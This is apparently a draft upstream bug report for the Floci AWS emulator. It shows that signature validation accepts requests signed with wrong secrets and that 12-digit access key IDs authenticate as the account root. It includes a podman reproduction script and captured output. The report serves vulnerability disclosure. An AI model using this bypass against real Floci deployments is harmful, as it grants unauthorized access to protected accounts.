# Floci bug: `FLOCI_AUTH_VALIDATE_SIGNATURES=true` has no effect (SigV4 not verified)

> Draft for filing upstream against Floci. Reproducible with `podman` alone (no project code).

## Summary

With `FLOCI_AUTH_VALIDATE_SIGNATURES=true` (and IAM enforcement enabled), Floci `1.5.33-compat`
still accepts requests signed with the **wrong** secret access key. The Access Key ID is read for
account resolution, but the SigV4 signature itself is never verified, so any secret authenticates.
A 12-digit AKID additionally authenticates as that account's `root` principal.

The result: signature validation and IAM policy enforcement cannot be relied on as a security
boundary on this build, even when both toggles are `true`.

## Environment

| | |
|---|---|
| Image | `docker.io/floci/floci:1.5.33-compat` |
| Runtime | Podman (also reproducible on Docker) |
| Config | `FLOCI_AUTH_VALIDATE_SIGNATURES=true`, `FLOCI_SERVICES_IAM_ENABLED=true`, `FLOCI_SERVICES_IAM_ENFORCEMENT_ENABLED=true` |

## Expected vs. actual

| Request | Expected | Actual |
|---|---|---|
| Known AKID + **wrong** secret → `sts get-caller-identity` | `SignatureDoesNotMatch` / access denied | Succeeds |
| Deployer AKID `floci` + **wrong** secret → `iam list-users` | `SignatureDoesNotMatch` / access denied | Succeeds |
| 12-digit AKID → `sts get-caller-identity` | An IAM principal (or denied) | `arn:aws:iam::<account>:root` |

## Reproduction

Self-contained; requires only `podman`, `aws` CLI, and `curl`. Each test starts its own Floci
container and removes it afterward (cleanup after every test; a trap guarantees teardown on exit).

```bash
#!/usr/bin/env bash
# Repro: FLOCI_AUTH_VALIDATE_SIGNATURES=true is not enforced on floci 1.5.33-compat.
# A request signed with the WRONG secret is still accepted.
set -uo pipefail

IMAGE="${FLOCI_IMAGE:-docker.io/floci/floci:1.5.33-compat}"
PORT="${FLOCI_PORT:-4566}"
NAME="floci-sigv4-repro"
ENDPOINT="http://localhost:${PORT}"
REGION="eu-west-2"

cleanup() { podman rm -f "$NAME" >/dev/null 2>&1 || true; }
trap cleanup EXIT          # safety net: always remove the container on exit

start_floci() {
  cleanup                  # drop any container left by a previous test
  podman run -d --name "$NAME" -p "${PORT}:4566" \
    -e FLOCI_AUTH_VALIDATE_SIGNATURES=true \
    -e FLOCI_SERVICES_IAM_ENABLED=true \
    -e FLOCI_SERVICES_IAM_ENFORCEMENT_ENABLED=true \
    -e FLOCI_SERVICES_IAM_SEED_DEPLOYER_PRINCIPAL=true \
    -e FLOCI_DEFAULT_REGION="$REGION" \
    -e FLOCI_DEFAULT_ACCOUNT_ID=000000000000 \
    -e FLOCI_TLS_ENABLED=false \
    "$IMAGE" >/dev/null
  local code=000
  for _ in $(seq 1 60); do
    code=$(curl -s -o /dev/null -w '%{http_code}' "${ENDPOINT}/_floci/init" 2>/dev/null || echo 000)
    [[ "$code" == "200" ]] && return 0
    sleep 2
  done
  echo "ERROR: Floci did not become ready"; podman logs "$NAME" 2>&1 | tail -30; return 1
}

# aws with an explicit (possibly wrong) credential pair; args after the pair are the aws command.
awscall() { AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" \
            aws --endpoint-url "$ENDPOINT" --region "$REGION" "${@:3}"; }

# test_case <title> <akid> <secret> <aws args...>
test_case() {
  local title="$1" akid="$2" secret="$3"; shift 3
  echo "== ${title} =="
  echo "   akid=${akid} secret=${secret}  (a valid response here means the bug reproduces)"
  start_floci || { echo; return; }
  awscall "$akid" "$secret" "$@" || true
  cleanup                  # cleanup after this test
  echo
}

test_case "Test 1: 12-digit AKID + WRONG secret (STS)" \
  111111111111 definitely-not-the-right-secret sts get-caller-identity
test_case "Test 2: deployer AKID 'floci' + WRONG secret (IAM)" \
  floci nope iam list-users
test_case "Test 3: 12-digit AKID authenticates as account root (STS)" \
  222222222222 any-secret sts get-caller-identity

echo "== If the calls above returned data instead of a signature error, the bug reproduces. =="
```

## Captured output

Validated 2026-07-31 against `docker.io/floci/floci:1.5.33-compat` on Podman. Every call returned
data instead of a signature error — the bug reproduces on all three tests:

```text
== Test 1: 12-digit AKID + WRONG secret (STS) ==
   akid=111111111111 secret=definitely-not-the-right-secret  (a valid response here means the bug reproduces)
{
    "UserId": "111111111111",
    "Account": "111111111111",
    "Arn": "arn:aws:iam::111111111111:root"
}

== Test 2: deployer AKID 'floci' + WRONG secret (IAM) ==
   akid=floci secret=nope  (a valid response here means the bug reproduces)
{
    "Users": [
        {
            "Path": "/",
            "UserName": "floci-deployer",
            "UserId": "AIDA7JNLYV1UHEN6XLDP",
            "Arn": "arn:aws:iam::000000000000:user/floci-deployer",
            "CreateDate": "2026-07-31T14:35:49.687686+00:00"
        }
    ]
}

== Test 3: 12-digit AKID authenticates as account root (STS) ==
   akid=222222222222 secret=any-secret  (a valid response here means the bug reproduces)
{
    "UserId": "222222222222",
    "Account": "222222222222",
    "Arn": "arn:aws:iam::222222222222:root"
}
```

## Impact

Signature validation and IAM policy enforcement are the intended primary security boundary for a
Floci-hosted estate. If a wrong secret authenticates while `FLOCI_AUTH_VALIDATE_SIGNATURES=true`,
the boundary is not actually enforced: any caller who knows an Access Key ID (or any 12-digit
account number) has full access. Callers who rely on this toggle for security get a false sense of
protection.

## References

- Multi-account / signature docs: <https://floci.io/floci/configuration/multi-account/>
- Environment variables: <https://floci.io/floci/configuration/environment-variables/>
